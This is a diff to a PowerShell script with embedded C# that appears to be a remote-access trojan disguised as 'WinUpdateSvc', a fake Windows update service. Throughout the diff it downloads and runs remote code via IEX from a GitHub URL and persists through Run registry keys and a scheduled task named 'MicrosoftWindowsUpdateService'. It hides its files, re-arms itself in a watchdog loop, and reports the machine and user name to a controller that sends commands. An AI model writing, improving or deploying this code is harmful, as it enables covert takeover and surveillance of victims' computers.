@@ -3,11 +3,14 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# Se estiver na tela normal, esconde e re-executa invisível
+# MODO VISÍVEL
 if ($args -notcontains "-silent") {
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if (-not $isAdmin) {
-        try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+        try { 
+            $wshell = New-Object -ComObject Wscript.Shell
+            $wshell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"", 1, $false)
+        } catch {}
         exit
     }
 
@@ -15,8 +18,7 @@ if ($args -notcontains "-silent") {
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, "$dir\$installName.ps1") } catch {}
     
-    $argList = "-nop -w hidden -ep bypass -f `"$dir\$installName.ps1`" -silent"
-    $cmd = "powershell.exe $argList"
+    $cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dir\$installName.ps1`" -silent"
     
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -24,13 +26,17 @@ if ($args -notcontains "-silent") {
     } catch {}
 
     try {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dir\$installName.ps1`" -silent"
         $trigger1 = New-ScheduledTaskTrigger -AtLogOn
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
         Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
-    Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
+    try {
+        $wshell = New-Object -ComObject Wscript.Shell
+        $wshell.Run("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dir\$installName.ps1`" -silent", 0, $false)
+    } catch {}
+    
     exit
 }
 
@@ -175,6 +181,7 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
                     globalWriter = myWriter;
 
+                    myWriter.WriteLine("PING");
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
@@ -194,7 +201,6 @@ if (-not ("R9KAgent" -as [type])) {
         static void WatchdogLoop() {
             string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
             string scriptPath = dir + @"\WinUpdateSvc.ps1";
-            string vbsPath = dir + @"\WinUpdateSvc.vbs";
             
             while (true) {
                 try {
@@ -204,22 +210,12 @@ if (-not ("R9KAgent" -as [type])) {
                         using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
-                    if (!File.Exists(vbsPath)) {
-                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
-                        File.WriteAllText(vbsPath, vbs);
-                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                    }
-                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
+                    string cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"" + scriptPath + "\" -silent";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
                     using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
-                    }
-                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
-                    if (!File.Exists(startupVbs)) {
-                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
                     }
                 } catch {}
                 Thread.Sleep(5000);
@@ -309,10 +305,8 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "reinstall") {
                     string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                     try {
-                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
-                        psi.WindowStyle = ProcessWindowStyle.Hidden;
-                        psi.CreateNoWindow = true;
-                        Process.Start(psi);
+                        var wshell = (dynamic)Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
+                        wshell.Run("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"", 0, false);
                     } catch {}
                     Environment.Exit(0); 
                 }
@@ -376,14 +370,8 @@ if (-not ("R9KAgent" -as [type])) {
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
-                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
-                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }
-                        
                         string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
-                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                         if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
-                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                     } catch {}
                     Environment.Exit(0); 
                 }
